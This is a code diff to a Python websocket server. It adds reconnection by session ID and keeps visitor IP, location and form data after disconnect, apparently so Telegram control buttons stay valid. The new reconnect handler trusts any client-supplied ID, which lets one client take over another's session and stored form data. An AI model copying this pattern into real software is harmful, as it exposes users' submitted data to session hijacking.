@@ -424,8 +424,9 @@ async def websocket_endpoint(websocket: WebSocket):
 
     await websocket.accept()
 
-    # Generate unique client ID
+    # Generate unique client ID (may be replaced if client reconnects)
     client_id = str(uuid.uuid4())
+    original_client_id = None  # Track if this was a reconnection
 
     # Store the connection
     connected_clients[client_id] = websocket
@@ -456,7 +457,58 @@ async def websocket_endpoint(websocket: WebSocket):
             msg_type = data.get("type")
             print(f"Received message from {client_id}: {msg_type}")
 
-            if msg_type == "client_info":
+            if msg_type == "reconnect":
+                # Client is reconnecting with existing client_id
+                # ALWAYS use the client's stored ID to keep Telegram buttons working
+                old_client_id = data.get("client_id")
+                print(f"Client attempting to reconnect with ID: {old_client_id}")
+                
+                if old_client_id:
+                    # Always adopt the old client_id to keep Telegram buttons valid
+                    print(f"Adopting client_id: {old_client_id}")
+                    
+                    # Remove the temporary new client_id
+                    if client_id in connected_clients:
+                        del connected_clients[client_id]
+                    if client_id in client_metadata:
+                        del client_metadata[client_id]
+                    
+                    # Use the old client_id
+                    original_client_id = client_id
+                    client_id = old_client_id
+                    
+                    # Update the connection reference
+                    connected_clients[client_id] = websocket
+                    
+                    # Initialize or restore metadata
+                    if client_id not in client_metadata:
+                        client_metadata[client_id] = {
+                            "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                            "ip": "Reconnected",
+                            "country": "Unknown",
+                            "city": "Unknown",
+                            "region": "Unknown"
+                        }
+                    
+                    # Initialize form_data if not exists
+                    if client_id not in client_form_data:
+                        client_form_data[client_id] = {}
+                    
+                    await websocket.send_json({
+                        "type": "reconnected",
+                        "client_id": client_id,
+                        "message": "Session restored"
+                    })
+                    print(f"Client reconnected with ID: {client_id}")
+                else:
+                    # No old client_id provided, keep the new one
+                    print(f"No old client_id provided, keeping: {client_id}")
+                    await websocket.send_json({
+                        "type": "connected",
+                        "client_id": client_id
+                    })
+
+            elif msg_type == "client_info":
                 print(f"Client info received: {data}")
                 # Update metadata with client info (don't send Telegram yet)
                 client_metadata[client_id].update({
@@ -521,13 +573,13 @@ async def websocket_endpoint(websocket: WebSocket):
     except Exception as e:
         print(f"Error with client {client_id}: {e}")
     finally:
-        # Clean up on disconnect
+        # Clean up connection reference on disconnect
         if client_id in connected_clients:
             del connected_clients[client_id]
-        if client_id in client_metadata:
-            del client_metadata[client_id]
-        if client_id in client_form_data:
-            del client_form_data[client_id]
+        # Keep metadata and form_data for potential reconnection
+        # They will be cleaned up if a new session is created or server restarts
+        # Only delete the WebSocket connection reference
+        print(f"Connection closed for {client_id}, form data preserved for reconnection")
 
 
 if __name__ == "__main__":
